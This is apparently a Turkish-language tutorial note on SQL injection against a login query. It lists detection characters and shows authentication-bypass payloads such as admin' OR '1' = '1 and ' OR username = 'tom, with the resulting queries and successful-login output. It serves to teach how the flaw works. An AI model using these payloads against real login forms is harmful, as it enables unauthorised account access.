# Subverting Query Logic

## Detection

Kimlik doğrulaması gerçekleştiren örnek bir web uygulamasını ele alalım.

Doğrulama için aşağıda verilen SQL sorgusu kullanılsın:

```sql title="Query"
SELECT * FROM logins WHERE username = 'admin' AND password = 'something';
```

Uygulamada SQLi zafiyeti olup olmadığını test etmek için aşağıda verilen operatörleri deneyebiliriz:

| PAYLOAD | URL |
|---|---|
| ' | %27 |
| " | %22 |
| # | %23 |
| ; | %3B |
| ) | %29 |

Örneğin, kullanıcı adı olarak ' karakterini verdiğimizde bir hata alabiliriz:

```sql title="Query"
SELECT * FROM logins WHERE username = ''' AND password = 'something';
```

```output title="Output"
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'something'' at line 1
```

## OR Injection

Kullanıcı adı kısmına aşağıdaki değeri girelim:

```sql title="Username"
admin' OR '1' = '1
```

!!! warning

    Girdi sonuna ' karakteri konulmadı. Bu karakter, web uygulaması tarafından konulacaktır.

Nihayetinde, asıl sorgu şu şekilde gözükecektir:

```sql title="Query"
SELECT * FROM logins WHERE username = 'admin' OR '1' = '1' AND password = 'something';
```

MySQL [işlem önceliği](https://dev.mysql.com/doc/refman/9.0/en/operator-precedence.html) göz önüne alındığında aşağıdaki sıra takip edilir:

```sql title="AND"
'1' = '1' AND password = 'something'
```

```sql title="OR"
username = 'admin' OR false
```

Bu sayede yanlış parola ile giriş yapabiliriz:

```output title="Output"
Login successful as user: admin
```

## Auth Bypass with OR Operator

### Unknown Username

Kullanıcı adı kısmına aşağıdaki değeri girelim:

```sql title="Username"
' OR '1' = '1
```

Parola kısmına aşağıdaki değeri girelim:

```sql title="Password"
' OR '1' = '1
```

Nihayetinde, asıl sorgu şu şekilde gözükecektir:

```sql title="Query"
SELECT * FROM logins WHERE username = '' OR '1' = '1' AND password = '' OR '1' = '1';
```

Tüm sorgu true olur, tüm tablo getirilir.

Ardından ilk satırdaki kullanıcı adı ile giriş yapılmış olur:

```output title="Output"
Login successful as user: admin
```

### Known Username

Parola kısmına aşağıdaki değeri girelim:

```sql title="Password"
' OR username = 'tom
```

Nihayetinde, asıl sorgu şu şekilde gözükecektir:

```sql title="Query"
SELECT * FROM logins WHERE username = '' AND password = '' OR username = 'tom';
```
